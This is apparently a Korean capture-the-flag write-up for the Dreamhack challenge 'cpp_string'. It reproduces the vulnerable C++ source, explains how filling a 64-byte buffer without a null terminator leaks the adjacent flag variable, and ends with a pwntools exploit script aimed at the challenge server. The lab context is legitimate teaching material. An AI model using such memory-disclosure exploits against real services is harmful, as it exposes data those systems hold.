---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN cpp_string"
excerpt: "드림핵 포너블 cpp_string 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-04-04 18:00
---

이번 문제는 드림핵 1단계 cpp_string이다.

C++에서 파일 읽기에 사용되는 is.read 함수는 C언어의 read함수를 std::ifstream에서 사용할 수 있게 포팅한 함수로 C언어의 read와 동일하게 동작한다.

이전 워 게임에서 메모리를 릭 할때 사용한 할당된 버퍼를 꽉 채운 뒤 null을 자리값을 임의 값으로 넣으면 이후 메모리 주소에 나열되어 있는 메모리 값이 같이 읽히는 것을 볼 수 있다. 이와 동일한 버그가 발생한다는 뜻이다.

우선 소스코드를 살펴보자.

```c++
//g++ -o cpp_string cpp_string.cpp
#include <iostream>
#include <fstream>
#include <csignal>
#include <unistd.h>
#include <stdlib.h>

char readbuffer[64] = {0, };
char flag[64] = {0, };
std::string writebuffer;

void alarm_handler(int trash)
{
    std::cout << "TIME OUT" << std::endl;
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int read_file(){
	std::ifstream is ("test", std::ifstream::binary);
	if(is.is_open()){
        	is.read(readbuffer, sizeof(readbuffer));
		is.close();

		std::cout << "Read complete!" << std::endl;
        	return 0;
	}
	else{
        	std::cout << "No testfile...exiting.." << std::endl;
        	exit(0);
	}
}

int write_file(){
	std::ofstream of ("test", std::ifstream::binary);
	if(of.is_open()){
		std::cout << "Enter file contents : ";
        	std::cin >> writebuffer;
		of.write(writebuffer.c_str(), sizeof(readbuffer));
                of.close();
		std::cout << "Write complete!" << std::endl;
        	return 0;
	}
	else{
		std::cout << "Open error!" << std::endl;
		exit(0);
	}
}

int read_flag(){
        std::ifstream is ("flag", std::ifstream::binary);
        if(is.is_open()){
                is.read(flag, sizeof(readbuffer));
                is.close();
                return 0;
        }
        else{
		std::cout << "You must need flagfile.." << std::endl;
                exit(0);
        }
}

int show_contents(){
	std::cout << "contents : ";
	std::cout << readbuffer << std::endl;
	return 0;
}
	


int main(void) {
    initialize();
    int selector = 0;
    while(1){
    	std::cout << "Simple file system" << std::endl;
    	std::cout << "1. read file" << std::endl;
    	std::cout << "2. write file" << std::endl;
	std::cout << "3. show contents" << std::endl;
    	std::cout << "4. quit" << std::endl;
    	std::cout << "[*] input : ";
	std::cin >> selector;
	
	switch(selector){
		case 1:
			read_flag();
			read_file();
			break;
		case 2:
			write_file();
			break;
		case 3:
			show_contents();
			break;
		case 4:
			std::cout << "BYEBYE" << std::endl;
			exit(0);
	}
    }
}
```

뭔가 기능이 많아보인다. main 함수부터 분석해보면 어떤 행동을 할지 selector 값을 입력 받는다.

1번 매뉴를 통해서 read_flag()함수가 동작하여 디렉터리에 있는 flag 파일을 버퍼 크기만큼 읽어 64 크기의 버퍼에 쓴다. 이후 read_file()함수를 통해 동일 디렉터리에 있는 file 파일을 버퍼 크기만큼 읽어 64 크기의 버퍼에 쓴다.

2번 매뉴를 통해서 file 파일에 버퍼 크기만큼의 값을 쓴다.

3번 매뉴를 통해 읽어온 file을 출력한다.

여기서 readbuffer와 flag 변수의 주소는 서로 연속적으로 배치되어 있다. readbuffer 다음에 바로 flag 변수의 주소이다.

따라서 readbuffer를 최대로 채워줘 문자열의 끝을 알리는 null 바이트를 다른 값으로 덮어 뜨면 flag 변수의 내용을 leak 할수 있다.

공격 코드는 다음과 같다.

```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 9645)
#p = process("./iofile_vtable_check", env={'LD_PRELOAD':'./libc.so.6'})
#p = process("./cpp_string")
elf = ELF("./cpp_string")
#libc = ELF("./libc.so.6")

p.sendlineafter(b"[*] input : ", b"2")
p.sendlineafter(b"Enter file contents : ", b"a"*64)


p.sendlineafter(b"[*] input : ", b"1")
p.sendlineafter(b"[*] input : ", b"3")

print(p.recv())


p.interactive()
```